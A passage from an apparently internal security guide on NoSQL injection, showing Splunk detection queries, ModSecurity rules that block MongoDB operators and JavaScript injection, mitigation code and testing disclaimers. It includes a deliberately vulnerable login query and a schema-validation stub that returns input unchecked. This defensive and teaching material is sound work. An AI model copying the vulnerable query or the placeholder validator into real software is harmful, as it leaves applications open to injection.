| eval nosql_injection_score=if(match(_raw,"(?i)\$where"),nosql_injection_score+4,nosql_injection_score)
| eval nosql_injection_score=if(match(_raw,"(?i)sleep\("),nosql_injection_score+5,nosql_injection_score)
| where nosql_injection_score >= 3
| stats count by src_ip, uri_path, user_agent
| sort -count
```

### WAF Rules for NoSQL Injection Prevention

```apache
# NoSQL Injection Prevention Rules
SecRule ARGS "@rx (?i:\$(?:ne|gt|lt|gte|lte|regex|where|exists|in|nin|or|and|not|all|size|type|mod))" \
    "id:2001,\
    phase:2,\
    block,\
    msg:'NoSQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'attack-nosql'"

# Block JavaScript injection in NoSQL queries
SecRule ARGS "@rx (?i:(?:function\s*\(|sleep\s*\(|eval\s*\(|this\.|new\s+Date|while\s*\(|for\s*\())" \
    "id:2002,\
    phase:2,\
    block,\
    msg:'NoSQL JavaScript Injection Detected',\
    tag:'attack-nosql'"
```

## Mitigation Strategies

### 1. Input Validation and Sanitization

```javascript
// Vulnerable NoSQL query
const user = await db.collection('users').findOne({
  email: req.body.email,
  password: req.body.password,
});

// Secure NoSQL query with validation
function validateInput(input) {
  // Reject if input contains NoSQL operators
  const prohibited = ['$ne', '$gt', '$lt', '$regex', '$where', '$exists'];
  const inputStr = JSON.stringify(input);

  for (const operator of prohibited) {
    if (inputStr.includes(operator)) {
      throw new Error('Invalid input detected');
    }
  }

  return input;
}

const user = await db.collection('users').findOne({
  email: validateInput(req.body.email),
  password: validateInput(req.body.password),
});
```

### 2. Parameterized Queries and Schema Validation

```javascript
// Use schema validation
const userSchema = {
  email: { type: 'string', pattern: '^[\\w.-]+@[\\w.-]+\\.[a-zA-Z]{2,}$' },
  password: { type: 'string', minLength: 8 },
};

// Validate against schema before query
const validateData = (data, schema) => {
  // Implementation of schema validation
  return data;
};

const validatedData = validateData(req.body, userSchema);
```

### 3. Disable JavaScript Execution

```javascript
// MongoDB: Disable server-side JavaScript
// In mongod.conf
/*
security:
  javascriptEnabled: false
*/

// Or via command line
// mongod --noscripting
```

## Legal and Ethical Considerations

⚠️ **IMPORTANT DISCLAIMERS:**

1. **Authorization Required**: Only test applications you own or have explicit written permission to test
2. **Scope Limitations**: Stay within the defined scope of testing
3. **Data Protection**: Do not access, modify, or exfiltrate real user data
4. **Responsible Disclosure**: Report vulnerabilities through proper channels
5. **Legal Compliance**: Ensure testing complies with local laws and regulations

## References

- [OWASP NoSQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html)
- [MongoDB Security Best Practices](https://docs.mongodb.com/manual/security/)
- [CouchDB Security Documentation](https://docs.couchdb.org/en/stable/intro/security.html)
- [CWE-943: NoSQL Injection](https://cwe.mitre.org/data/definitions/943.html)

---

**Last Updated**: May 27, 2025  
**Version**: 1.0  
**Classification**: Internal Use Only
